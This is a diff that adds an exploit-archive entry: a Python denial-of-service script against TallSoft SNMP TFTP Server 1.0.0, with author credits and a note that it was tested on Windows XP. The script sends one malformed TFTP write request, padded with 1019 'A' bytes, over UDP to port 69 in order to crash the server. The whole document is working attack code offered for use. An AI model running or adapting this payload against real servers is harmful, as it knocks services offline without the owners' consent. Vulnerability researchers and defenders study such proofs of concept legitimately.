@@ -1,0 +1,24 @@
+# Exploit Title: TallSoft SNMP TFTP Server 1.0.0 - DoS
+# Date: 28-03-2016
+# Software Link: http://www.tallsoft.com/snmp_tftpserver.exe
+# Exploit Author: Charley Celice (stmerry)
+# Contact: https://twitter.com/charleycelice
+#
+# Credits: Based off TallSoft Quick TFTP Server 2.2 DoS
+# * https://www.exploit-db.com/exploits/26010/
+#
+# Category: Denial of Service
+# Tested on: Windows XP SP3 English
+# Details: Remotely crash TallSoft SNMP TFTP Server
+
+from socket import *
+import sys, select
+
+address = ('127.0.0.1', 69)
+
+# sufficient for the crash to work
+crash = "\x00\x02\x00"
+crash += "\x41"*1019
+ 
+server_socket = socket(AF_INET, SOCK_DGRAM)
+server_socket.sendto(crash, address)
